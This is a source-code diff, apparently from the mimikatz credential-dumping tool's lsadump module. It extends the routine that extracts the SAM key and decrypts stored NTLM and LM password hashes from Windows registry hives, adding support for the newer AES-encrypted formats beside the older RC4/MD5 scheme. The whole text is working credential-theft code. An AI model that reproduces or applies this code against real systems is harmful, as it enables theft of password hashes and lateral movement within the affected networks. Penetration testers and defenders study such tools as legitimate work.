@@ -25,7 +25,7 @@ const KUHL_M kuhl_m_lsadump = {
 NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 {
 	HANDLE hDataSystem, hDataSam;
-	PKULL_M_REGISTRY_HANDLE hRegistry;
+	PKULL_M_REGISTRY_HANDLE hRegistry, hRegistry2;
 	HKEY hBase;
 	BYTE sysKey[SYSKEY_LENGTH];
 	LPCWSTR szSystem = NULL, szSam = NULL;
@@ -44,10 +44,10 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 						hDataSam = CreateFile(szSam, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 						if(hDataSam != INVALID_HANDLE_VALUE)
 						{
-							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSam, FALSE, &hRegistry))
+							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSam, FALSE, &hRegistry2))
 							{
-								kuhl_m_lsadump_getUsersAndSamKey(hRegistry, NULL, sysKey);
-								kull_m_registry_close(hRegistry);
+								kuhl_m_lsadump_getUsersAndSamKey(hRegistry2, NULL, sysKey);
+								kull_m_registry_close(hRegistry2);
 							}
 							CloseHandle(hDataSam);
 						}
@@ -331,7 +331,7 @@ BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN H
 				kull_m_registry_RegCloseKey(hRegistry, hUsers);
 			}
 		}
-		else PRINT_ERROR(L"kuhl_m_lsadump_getKe KO\n");
+		else PRINT_ERROR(L"kuhl_m_lsadump_getSamKey KO\n");
 		kull_m_registry_RegCloseKey(hRegistry, hAccount);
 	}
 	else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx SAM Accounts");
@@ -345,25 +345,55 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 {
 	BOOL status = FALSE;
 	MD5_CTX md5ctx;
+	PSAM_HASH pHash = (PSAM_HASH) (pStartOfData + pSamHash->offset);
+	PSAM_HASH_AES pHashAes;
 	BYTE cypheredHash[LM_NTLM_HASH_LENGTH], clearHash[LM_NTLM_HASH_LENGTH];
 	CRYPTO_BUFFER cypheredHashBuffer = {LM_NTLM_HASH_LENGTH, LM_NTLM_HASH_LENGTH, cypheredHash}, keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	PVOID out;
+	DWORD len;
 
 	kprintf(L"%s : ", isNtlm ? L"NTLM" : L"LM  ");
-	if(pSamHash->offset && (pSamHash->lenght == sizeof(SAM_HASH)))
+	if(pSamHash->offset)
 	{
-		MD5Init(&md5ctx);
-		MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
-		MD5Update(&md5ctx, &rid, sizeof(DWORD));
-		MD5Update(&md5ctx, isNtlm ? kuhl_m_lsadump_NTPASSWORD : kuhl_m_lsadump_LMPASSWORD , isNtlm ? sizeof(kuhl_m_lsadump_NTPASSWORD) : sizeof(kuhl_m_lsadump_LMPASSWORD));
-		MD5Final(&md5ctx);
+		switch(pHash->Revision)
+		{
+		case 1:
+			if(pSamHash->lenght == sizeof(SAM_HASH))
+			{
+				MD5Init(&md5ctx);
+				MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
+				MD5Update(&md5ctx, &rid, sizeof(DWORD));
+				MD5Update(&md5ctx, isNtlm ? kuhl_m_lsadump_NTPASSWORD : kuhl_m_lsadump_LMPASSWORD, isNtlm ? sizeof(kuhl_m_lsadump_NTPASSWORD) : sizeof(kuhl_m_lsadump_LMPASSWORD));
+				MD5Final(&md5ctx);
+				RtlCopyMemory(cypheredHash, pHash->hash, LM_NTLM_HASH_LENGTH);
+				if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
+					PRINT_ERROR(L"RtlEncryptDecryptRC4");
+			}
+			break;
+		case 2:
+			pHashAes = (PSAM_HASH_AES) pHash;
+			if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
+			{
 
-		RtlCopyMemory(cypheredHash, ((PSAM_HASH) (pStartOfData + pSamHash->offset))->hash, LM_NTLM_HASH_LENGTH);
-		if(NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer)))
+				if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
+				{
+					if(status = (len == LM_NTLM_HASH_LENGTH))
+						RtlCopyMemory(cypheredHash, out, LM_NTLM_HASH_LENGTH);
+					else PRINT_ERROR(L"Hash size %u != %u", len, LM_NTLM_HASH_LENGTH);
+					LocalFree(out);
+				}
+			}
+			break;
+		default :
+			PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)", pHash->Revision);
+		}
+
+		if(status)
 		{
 			if(status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cypheredHash, &rid, clearHash)))
 				kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
 			else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
-		} else PRINT_ERROR(L"RtlEncryptDecryptRC4");
+		}
 	}
 	kprintf(L"\n");
 	return status;
@@ -377,14 +407,17 @@ BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, 
 	PDOMAIN_ACCOUNT_F pDomAccF;
 	MD5_CTX md5ctx;
 	CRYPTO_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
-	DWORD szNeeded = 0;
+	PSAM_KEY_DATA_AES pAesKey;
+	PVOID out;
+	DWORD len;
 
 	kprintf(L"\nSAMKey : ");
-	if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", NULL, NULL, NULL, &szNeeded))
+	if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hAccount, NULL, L"F", NULL, (LPVOID *) &pDomAccF, NULL))
 	{
-		if(pDomAccF = (PDOMAIN_ACCOUNT_F) LocalAlloc(LPTR, szNeeded))
+		switch(pDomAccF->Revision)
 		{
-			if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", NULL, NULL, (LPBYTE) pDomAccF, &szNeeded))
+		case 2:
+			if(pDomAccF->keys1.Revision == 1)
 			{
 				MD5Init(&md5ctx);
 				MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
@@ -392,17 +425,36 @@ BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, 
 				MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
 				MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
 				MD5Final(&md5ctx);
-
 				RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
-				if(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
-					kull_m_string_wprintf_hex(samKey, LM_NTLM_HASH_LENGTH, 0);
-				else PRINT_ERROR(L"RtlEncryptDecryptRC4 KO");
+				if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key))))
+					PRINT_ERROR(L"RtlEncryptDecryptRC4 KO");
 			}
-			else PRINT_ERROR(L"kull_m_registry_RegQueryValueEx F KO");
-			LocalFree(pDomAccF);
+			else PRINT_ERROR(L"Unknow Classic Struct Key revision (%u)", pDomAccF->keys1.Revision);
+			break;
+		case 3:
+			pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
+			if(pAesKey->Revision == 2)
+			{
+				pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
+				if(kull_m_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))
+				{
+					if(status = (len == SAM_KEY_DATA_KEY_LENGTH))
+						RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);
+					LocalFree(out);
+				}
+			}
+			else PRINT_ERROR(L"Unknow Struct Key revision (%u)", pDomAccF->keys1.Revision);
+			break;
+		default:
+			PRINT_ERROR(L"Unknow F revision (%hu)", pDomAccF->Revision);
 		}
+		LocalFree(pDomAccF);
 	}
-	else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx F KO");
+	else PRINT_ERROR(L"kull_m_registry_OpenAndQueryWithAlloc KO");
+
+	if(status)
+		kull_m_string_wprintf_hex(samKey, LM_NTLM_HASH_LENGTH, 0);
+
 	kprintf(L"\n");
 	return status;
 }
